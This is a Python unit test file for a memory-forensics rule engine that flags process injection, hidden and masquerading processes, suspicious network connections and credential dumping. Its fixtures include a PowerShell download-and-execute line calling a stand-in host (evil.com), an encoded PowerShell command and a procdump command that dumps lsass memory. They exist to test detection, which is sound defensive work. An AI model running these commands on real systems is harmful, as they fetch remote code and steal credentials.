#!/usr/bin/env python3
"""
Unit tests for the MemFlow Rule Engine.
Run with:  python -m pytest cli_tool/test_rule_engine.py -v
Or:        python cli_tool/test_rule_engine.py
"""

import sys
import os
import unittest

sys.path.insert(0, os.path.dirname(__file__))

from rule_engine import (
    RuleEngine, Alert, Severity, AlertCategory, RULE_REGISTRY,
    detect_orphan_processes, detect_hidden_processes, detect_injected_memory,
    detect_external_connections, detect_suspicious_dlls,
    detect_process_masquerading, detect_suspicious_cmdline,
    detect_suspicious_services, detect_suspicious_parent_child,
    detect_credential_dumping,
)


# ---------------------------------------------------------------------------
# Helper builders
# ---------------------------------------------------------------------------

def make_process(pid: str, ppid: str, name: str) -> dict:
    return {
        "PID": pid, "PPID": ppid, "ImageFileName": name,
        "Offset": "0x0", "Threads": "1", "Handles": "100",
        "SessionId": "1", "Wow64": "False",
        "CreateTime": "2024-01-01 00:00:00", "ExitTime": "N/A",
    }


def make_connection(state: str, foreign: str, owner: str, pid: str = "1234",
                    proto: str = "TCPv4", local: str = "10.0.0.5:50000") -> dict:
    return {
        "Offset": "0x0", "Proto": proto, "LocalAddr": local,
        "ForeignAddr": foreign, "State": state, "PID": pid, "Owner": owner,
    }


# ---------------------------------------------------------------------------
# Tests: detect_orphan_processes  (ORF-001)
# ---------------------------------------------------------------------------

class TestOrphanProcesses(unittest.TestCase):

    def test_no_orphans_in_normal_tree(self):
        procs = [
            make_process("4",    "0",   "System"),
            make_process("600",  "4",   "smss.exe"),
            make_process("800",  "600", "csrss.exe"),
            make_process("1000", "600", "wininit.exe"),
        ]
        self.assertEqual(detect_orphan_processes(procs), [])

    def test_orphan_detected_with_mitre(self):
        procs = [
            make_process("4",    "0",    "System"),
            make_process("1234", "9999", "malware.exe"),
        ]
        alerts = detect_orphan_processes(procs)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].id, "ORF-001")
        self.assertEqual(alerts[0].severity, Severity.HIGH)
        ids = [t["id"] for t in alerts[0].mitre_techniques]
        self.assertIn("T1055",     ids)
        self.assertIn("T1134.004", ids)

    def test_multiple_orphans(self):
        procs = [
            make_process("4",    "0",    "System"),
            make_process("1234", "9990", "evil1.exe"),
            make_process("1235", "9991", "evil2.exe"),
        ]
        self.assertEqual(len(detect_orphan_processes(procs)), 2)

    def test_empty_and_none(self):
        self.assertEqual(detect_orphan_processes([]),   [])
        self.assertEqual(detect_orphan_processes(None), [])

    def test_windows_boot_processes_not_flagged(self):
        procs = [
            make_process("4",   "0",   "System"),
            make_process("344", "4",   "smss.exe"),
            make_process("472", "460", "csrss.exe"),
            make_process("524", "460", "wininit.exe"),
            make_process("516", "508", "csrss.exe"),
            make_process("552", "508", "winlogon.exe"),
        ]
        self.assertEqual(detect_orphan_processes(procs), [], "boot processes must not fire")

    def test_non_boot_orphan_fires(self):
        procs = [
            make_process("4",    "0",    "System"),
            make_process("344",  "4",    "smss.exe"),
            make_process("2720", "2444", "Oobe.exe"),
        ]
        alerts = detect_orphan_processes(procs)
        self.assertEqual(len(alerts), 1)
        self.assertIn("Oobe.exe", alerts[0].description)


# ---------------------------------------------------------------------------
# Tests: detect_hidden_processes  (HID-001)
# ---------------------------------------------------------------------------

class TestHiddenProcesses(unittest.TestCase):

    PSLIST = "PID   PPID  ImageFileName\n4     0     System\n800   4     csrss.exe\n"
    PSSCAN_CLEAN  = "PID   PPID  ImageFileName\n4     0     System\n800   4     csrss.exe\n"
    PSSCAN_HIDDEN = "PID   PPID  ImageFileName\n4     0     System\n800   4     csrss.exe\n1337  4     rootkit.exe\n"

    def test_no_hidden(self):
        self.assertEqual(detect_hidden_processes(self.PSLIST, self.PSSCAN_CLEAN), [])

    def test_hidden_detected_with_mitre(self):
        alerts = detect_hidden_processes(self.PSLIST, self.PSSCAN_HIDDEN)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].id, "HID-001")
        self.assertEqual(alerts[0].severity, Severity.CRITICAL)
        ids = [t["id"] for t in alerts[0].mitre_techniques]
        self.assertIn("T1014",     ids)
        self.assertIn("T1564.001", ids)

    def test_missing_input_returns_empty(self):
        self.assertEqual(detect_hidden_processes(None, self.PSSCAN_HIDDEN), [])
        self.assertEqual(detect_hidden_processes(self.PSLIST, None), [])


# ---------------------------------------------------------------------------
# Tests: detect_injected_memory  (INJ-001)
# ---------------------------------------------------------------------------

class TestInjectedMemory(unittest.TestCase):

    RWX_WITH_PE = (
        "Process:  explorer.exe  Pid: 2468  Address: 0x1a2b3c4d  Vad Tag: VadS\n"
        "Protection: PAGE_EXECUTE_READWRITE\n"
        "0x1a2b3c4d  4d 5a 90 00 03 00 00 00  MZ......\n\n"
    )
    RWX_NO_PE = (
        "Process:  explorer.exe  Pid: 2468  Address: 0xdeadbeef  Vad Tag: VadS\n"
        "Protection: PAGE_EXECUTE_READWRITE\n"
        "0xdeadbeef  90 90 90 cc cc cc cc cc  ........\n\n"
    )
    BENIGN = (
        "Process:  notepad.exe  Pid: 1111  Address: 0x00001000  Vad Tag: VadS\n"
        "Protection: PAGE_EXECUTE_READ\n"
        "0x00001000  48 89 5c 24 08 48 89 6c  H.\\$.H.l\n\n"
    )

    def test_rwx_with_pe_is_critical_with_hollowing_technique(self):
        alerts = detect_injected_memory(self.RWX_WITH_PE)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].severity, Severity.CRITICAL)
        ids = [t["id"] for t in alerts[0].mitre_techniques]
        self.assertIn("T1055",     ids)
        self.assertIn("T1055.012", ids)  # hollowing only when PE present

    def test_rwx_no_pe_is_high_injection_only(self):
        alerts = detect_injected_memory(self.RWX_NO_PE)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].severity, Severity.HIGH)
        ids = [t["id"] for t in alerts[0].mitre_techniques]
        self.assertIn("T1055",     ids)
        self.assertNotIn("T1055.012", ids)

    def test_benign_no_alert(self):
        self.assertEqual(detect_injected_memory(self.BENIGN), [])

    def test_none_returns_empty(self):
        self.assertEqual(detect_injected_memory(None), [])


# ---------------------------------------------------------------------------
# Tests: detect_external_connections  (NET-001)
# ---------------------------------------------------------------------------

class TestExternalConnections(unittest.TestCase):

    def test_external_established_flagged_with_mitre(self):
        conns = [make_connection("ESTABLISHED", "185.220.101.42:443", "chrome.exe")]
        alerts = detect_external_connections(conns)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].id, "NET-001")
        ids = [t["id"] for t in alerts[0].mitre_techniques]
        self.assertIn("T1071.001", ids)
        self.assertIn("T1041",     ids)

    def test_private_ip_not_flagged(self):
        conns = [make_connection("ESTABLISHED", "192.168.1.1:80", "svchost.exe")]
        self.assertEqual(detect_external_connections(conns), [])

    def test_listening_not_flagged(self):
        conns = [make_connection("LISTENING", "185.220.101.42:443", "nc.exe")]
        self.assertEqual(detect_external_connections(conns), [])

    def test_system_process_external_is_critical(self):
        conns = [make_connection("ESTABLISHED", "1.2.3.4:443", "lsass.exe")]
        alerts = detect_external_connections(conns)
        self.assertEqual(alerts[0].severity, Severity.CRITICAL)

    def test_dedup_same_ip(self):
        conns = [
            make_connection("ESTABLISHED", "1.1.1.1:80",  "chrome.exe"),
            make_connection("ESTABLISHED", "1.1.1.1:443", "chrome.exe"),
        ]
        self.assertEqual(len(detect_external_connections(conns)), 1)

    def test_empty_and_none(self):
        self.assertEqual(detect_external_connections([]),   [])
        self.assertEqual(detect_external_connections(None), [])


# ---------------------------------------------------------------------------
# Tests: detect_suspicious_dlls  (DLL-001)
# ---------------------------------------------------------------------------

class TestSuspiciousDlls(unittest.TestCase):

    CLEAN = (
        "Process:  explorer.exe  Pid: 1234\n"
        "0x7ff800000000  0x100000  False  kernel32.dll  C:\\Windows\\System32\\kernel32.dll\n"
    )
    SUSPICIOUS = (
        "Process:  explorer.exe  Pid: 1234\n"
        "0x7ff800000000  0x100000  False  kernel32.dll  C:\\Windows\\System32\\kernel32.dll\n"
        "0x000000010000  0x050000  False  evil.dll       C:\\Users\\victim\\AppData\\Local\\Temp\\evil.dll\n"
    )

    def test_clean_no_alert(self):
        self.assertEqual(detect_suspicious_dlls(self.CLEAN), [])

    def test_temp_dll_flagged_with_mitre(self):
        alerts = detect_suspicious_dlls(self.SUSPICIOUS)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].id, "DLL-001")
        ids = [t["id"] for t in alerts[0].mitre_techniques]
        self.assertIn("T1574.001", ids)
        self.assertIn("T1574.002", ids)

    def test_none_returns_empty(self):
        self.assertEqual(detect_suspicious_dlls(None), [])


# ---------------------------------------------------------------------------
# Tests: detect_process_masquerading  (PROC-001)
# ---------------------------------------------------------------------------

class TestProcessMasquerading(unittest.TestCase):

    def test_digit_substitution_detected(self):
        """svch0st.exe (0→o) must fire PROC-001."""
        procs = [make_process("4", "0", "System"), make_process("1234", "4", "svch0st.exe")]
        alerts = detect_process_masquerading(procs)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].id, "PROC-001")
        self.assertEqual(alerts[0].severity, Severity.HIGH)
        ids = [t["id"] for t in alerts[0].mitre_techniques]
        self.assertIn("T1036",     ids)
        self.assertIn("T1036.005", ids)

    def test_exact_system_name_not_flagged(self):
        procs = [make_process("4", "0", "svchost.exe")]
        self.assertEqual(detect_process_masquerading(procs), [])

    def test_unrelated_name_not_flagged(self):
        procs = [make_process("1234", "4", "notepad.exe")]
        self.assertEqual(detect_process_masquerading(procs), [])

    def test_empty_and_none(self):
        self.assertEqual(detect_process_masquerading([]),   [])
        self.assertEqual(detect_process_masquerading(None), [])


# ---------------------------------------------------------------------------
# Tests: detect_suspicious_cmdline  (CMD-001)
# ---------------------------------------------------------------------------

class TestSuspiciousCmdline(unittest.TestCase):

    ENC = (
        "powershell.exe -NoProfile -EncodedCommand "
        "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\n"
    )
    IEX = "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/a')\n"
    CLEAN = "C:\\Windows\\System32\\svchost.exe -k netsvcs\n"

    def test_encoded_command_detected_with_mitre(self):
        alerts = detect_suspicious_cmdline(self.ENC)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].id, "CMD-001")
        ids = [t["id"] for t in alerts[0].mitre_techniques]
        self.assertIn("T1059.001", ids)
        self.assertIn("T1027",     ids)

    def test_iex_download_detected(self):
        alerts = detect_suspicious_cmdline(self.IEX)
        self.assertGreaterEqual(len(alerts), 1)

    def test_clean_no_alert(self):
        self.assertEqual(detect_suspicious_cmdline(self.CLEAN), [])

    def test_none_returns_empty(self):
        self.assertEqual(detect_suspicious_cmdline(None), [])


# ---------------------------------------------------------------------------
# Tests: detect_suspicious_parent_child  (PPID-001)
# ---------------------------------------------------------------------------

class TestSuspiciousParentChild(unittest.TestCase):

    def test_word_spawning_cmd_is_high(self):
        procs = [
            make_process("4",    "0",    "System"),
            make_process("1000", "4",    "winword.exe"),
            make_process("2000", "1000", "cmd.exe"),
        ]
        alerts = detect_suspicious_parent_child(procs)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].id, "PPID-001")
        self.assertEqual(alerts[0].severity, Severity.HIGH)
        ids = [t["id"] for t in alerts[0].mitre_techniques]
        self.assertIn("T1566.001", ids)
        self.assertIn("T1204.002", ids)

    def test_browser_spawning_cmd_is_medium(self):
        procs = [
            make_process("4",    "0",    "System"),
            make_process("1000", "4",    "chrome.exe"),
            make_process("2000", "1000", "cmd.exe"),
        ]
        alerts = detect_suspicious_parent_child(procs)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].severity, Severity.MEDIUM)

    def test_svchost_spawning_cmd_not_flagged(self):
        procs = [
            make_process("4",    "0",    "System"),
            make_process("1000", "4",    "svchost.exe"),
            make_process("2000", "1000", "cmd.exe"),
        ]
        self.assertEqual(detect_suspicious_parent_child(procs), [])

    def test_empty_and_none(self):
        self.assertEqual(detect_suspicious_parent_child([]),   [])
        self.assertEqual(detect_suspicious_parent_child(None), [])


# ---------------------------------------------------------------------------
# Tests: detect_credential_dumping  (CRED-001)
# ---------------------------------------------------------------------------

class TestCredentialDumping(unittest.TestCase):

    def test_mimikatz_process_detected_with_mitre(self):
        procs = [make_process("4", "0", "System"), make_process("1234", "4", "mimikatz.exe")]
        alerts = detect_credential_dumping(procs)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].id, "CRED-001")
        self.assertEqual(alerts[0].severity, Severity.CRITICAL)
        ids = [t["id"] for t in alerts[0].mitre_techniques]
        self.assertIn("T1003",     ids)
        self.assertIn("T1003.001", ids)

    def test_lsass_cmdline_pattern_detected(self):
        cmdline = "procdump.exe -ma lsass.exe lsass.dmp\n"
        alerts = detect_credential_dumping([], cmdline)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].severity, Severity.CRITICAL)

    def test_clean_no_alert(self):
        procs = [make_process("4", "0", "System")]
        self.assertEqual(detect_credential_dumping(procs), [])

    def test_none_returns_empty(self):
        self.assertEqual(detect_credential_dumping(None),       [])
        self.assertEqual(detect_credential_dumping([], None),   [])


# ---------------------------------------------------------------------------
# Tests: RuleEngine & RULE_REGISTRY
# ---------------------------------------------------------------------------

class TestRuleEngineSummarize(unittest.TestCase):

    def _make_alert(self, sev: Severity) -> Alert:
        return Alert(
            id="TEST-001", severity=sev, category=AlertCategory.PROCESS,
            title="Test", description="Test", dfir_explanation="Test",
            evidence=[], affected_artifacts=[], mitre_techniques=[],
        )

    def test_summary_counts(self):
        engine = RuleEngine()
        alerts = [
            self._make_alert(Severity.CRITICAL),
            self._make_alert(Severity.CRITICAL),
            self._make_alert(Severity.HIGH),
            self._make_alert(Severity.LOW),
        ]
        summary = engine.summarize(alerts)
        self.assertEqual(summary["total"],    4)
        self.assertEqual(summary["critical"], 2)
        self.assertEqual(summary["high"],     1)
        self.assertEqual(summary["medium"],   0)
        self.assertEqual(summary["low"],      1)

    def test_empty_summary(self):
        self.assertEqual(RuleEngine().summarize([])["total"], 0)


class TestRuleRegistry(unittest.TestCase):

    def test_all_ten_rules_registered(self):
        expected = {"ORF-001", "HID-001", "INJ-001", "NET-001", "DLL-001",
                    "PROC-001", "CMD-001", "SVC-001", "PPID-001", "CRED-001"}
        self.assertEqual(set(RULE_REGISTRY.keys()), expected)

    def test_all_rules_enabled_by_default(self):
        for rid, meta in RULE_REGISTRY.items():
            self.assertTrue(meta.get("enabled"), f"{rid} should be enabled by default")

    def test_all_rules_have_mitre_ids(self):
        for rid, meta in RULE_REGISTRY.items():
            self.assertTrue(len(meta.get("mitre_ids", [])) > 0,
                            f"{rid} must have at least one MITRE technique ID")

    def test_selective_engine_only_runs_chosen_rules(self):
        engine = RuleEngine(enabled_rules={"ORF-001"})
        result = {
            "raw_volatility_data": {"process_list": [], "network_connections": []},
            "_plugin_results_raw": {},
        }
        # Empty process list → no orphan alerts; other rules disabled → no alerts
        self.assertEqual(engine.run_all_rules(result), [])


# ---------------------------------------------------------------------------
# Run
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    print("=" * 60)
    print("MemFlow Rule Engine – Unit Tests")
    print("=" * 60)
    unittest.main(verbosity=2)
